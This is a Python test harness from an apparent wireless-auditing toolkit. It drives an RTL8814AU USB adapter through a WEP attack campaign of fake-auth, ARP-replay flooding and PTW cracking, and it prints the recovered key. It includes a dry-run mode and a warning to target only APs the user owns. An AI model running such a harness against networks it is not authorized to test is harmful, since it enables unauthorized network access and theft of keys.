"""RTL8814AU (vendor/DKMS port) — live WEP ARP-replay / IV-generation harness (M4d).

Drives the dkms driver through the EXISTING, device-agnostic WEP machinery — there is
no port-specific injection or attack code here. It wraps the driver in a real
``WlanInterface`` (which feeds RX into ``wep_store`` and exposes ``send_raw`` ->
``inject_frame``) and runs the stock ``WepCampaign`` (fake-auth -> ARP replay -> ChopChop
fallback -> PTW crack) against a WEP AP. The replay injects via the same M4a/M4b
``inject_frame`` path the deauth harness (M4c) exercises — so if M4c's injection works,
this works; a deauth-injection fix lands in the shared path and propagates here.

Needs the WEP test router (channel 6 in the lab). This TRANSMITS: fake-auth associates a
forged STA with the target AP, then ARP replay floods it. Point it only at a WEP AP you
own. ``--dry-run`` brings up + tunes + constructs the campaign but starts NOTHING (no TX).

Usage (card plugged in; on Linux unbind the kernel driver, on Windows Zadig/WinUSB):
    # SAFE wiring check (no TX):
    .venv\\Scripts\\python.exe scripts\\rtl8814au_dkms\\wep_replay_hw.py \\
        --bssid AA:BB:CC:DD:EE:FF --channel 6 --dry-run
    # LIVE (generate IVs, attempt the crack):
    .venv\\Scripts\\python.exe scripts\\rtl8814au_dkms\\wep_replay_hw.py \\
        --bssid AA:BB:CC:DD:EE:FF --channel 6 --duration 180

Target BSSID stays on your terminal only; never commit it.
"""
from __future__ import annotations

import argparse
import asyncio
import logging
import re
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

import libusb_package
import usb.core

from wifit3.chips.rtl8814au_dkms.driver import Rtl8814auDkmsDriver
from wifit3.engine.attacks.wep.campaign import WepCampaign
from wifit3.engine.models import AccessPoint
from wifit3.wlan.interface import WlanInterface

_MARKUP = re.compile(r"\[/?[^\]]*\]")   # strip rich markup tags for plain console output


def _plain(msg: str) -> None:
    print("  " + _MARKUP.sub("", msg))


async def run(args) -> int:
    entry = Rtl8814auDkmsDriver.SUPPORTED_IDS[0]
    backend = libusb_package.get_libusb1_backend()
    dev = usb.core.find(idVendor=entry.vid, idProduct=entry.pid, backend=backend)
    if dev is None:
        print(f"[FAIL] no {entry.vid:04x}:{entry.pid:04x} on the USB bus")
        return 1
    try:
        dev.set_configuration()
    except usb.core.USBError as e:
        logging.debug("set_configuration: %s", e)

    driver = Rtl8814auDkmsDriver.from_usb_device(dev, entry)
    # A real WlanInterface registers the driver's rx callback and owns wep_store, so the
    # stock WEP campaign drives the dkms driver exactly as it would a registered one.
    iface = WlanInterface(driver, entry.description, entry.description)

    def progress(pct, msg):
        print(f"  [{pct * 100:5.1f}%] {msg}")

    if not await iface.connect(progress):
        print("[FAIL] bring-up did not reach FW-ready")
        return 1
    await iface.set_channel(args.channel)
    print(f"[*] tuned to channel {args.channel}")

    target = AccessPoint(bssid=args.bssid.lower(), ssid=args.ssid,
                         channel=args.channel, encryption="WEP")
    campaign = WepCampaign(iface, target, log_callback=_plain)

    if args.dry_run:
        print("[DRY-RUN] campaign constructed; not started (no TX). Wiring OK.")
        await driver.close()
        return 0

    print(f"[*] WEP IV campaign on {args.bssid.lower()} (ch {args.channel}) — "
          f"fake-auth + ARP replay; this TRANSMITS. Ctrl-C to stop.")
    campaign.start()
    start = time.monotonic()
    try:
        while time.monotonic() - start < args.duration and campaign.recovered_key is None:
            await asyncio.sleep(2.0)
            ivs = iface.wep_store.unique_count(target.bssid)
            s = campaign.replay.stats
            print(f"\r  {time.monotonic() - start:4.0f}s  IVs={ivs}  "
                  f"state={campaign.replay.state}  injected={s.injected}  "
                  f"pps={campaign.replay.target_pps:.0f}  winner={s.has_winner}", end="")
    except KeyboardInterrupt:
        pass
    print()
    key = campaign.recovered_key
    campaign.stop()
    await asyncio.sleep(0.2)
    await driver.close()

    ivs = iface.wep_store.unique_count(target.bssid)
    if key is not None:
        ascii_hint = f' = "{key.decode("ascii")}"' if all(0x20 <= b < 0x7F for b in key) else ""
        print(f"[RESULT] CRACKED WEP KEY: {key.hex()}{ascii_hint}  ({ivs} IVs)")
    else:
        print(f"[RESULT] {ivs} unique IVs, {campaign.replay.stats.injected} frames injected. "
              f"{'Replay locked a winner.' if campaign.replay.stats.has_winner else 'No replayable ARP yet (try a deauth to provoke one, or more time).'}")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="RTL8814AU DKMS WEP ARP-replay harness (M4d)")
    ap.add_argument("--bssid", required=True, help="target WEP AP BSSID")
    ap.add_argument("--ssid", default=None, help="target SSID (display only)")
    ap.add_argument("--channel", type=int, required=True, help="the AP's 2.4G channel")
    ap.add_argument("--duration", type=float, default=120.0, help="run window (s)")
    ap.add_argument("--dry-run", action="store_true",
                    help="bring up + tune + construct the campaign, but start NOTHING (no TX)")
    ap.add_argument("--debug", action="store_true")
    args = ap.parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(asctime)s.%(msecs)03d [%(levelname)-5s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )
    return asyncio.run(run(args))


if __name__ == "__main__":
    sys.exit(main())
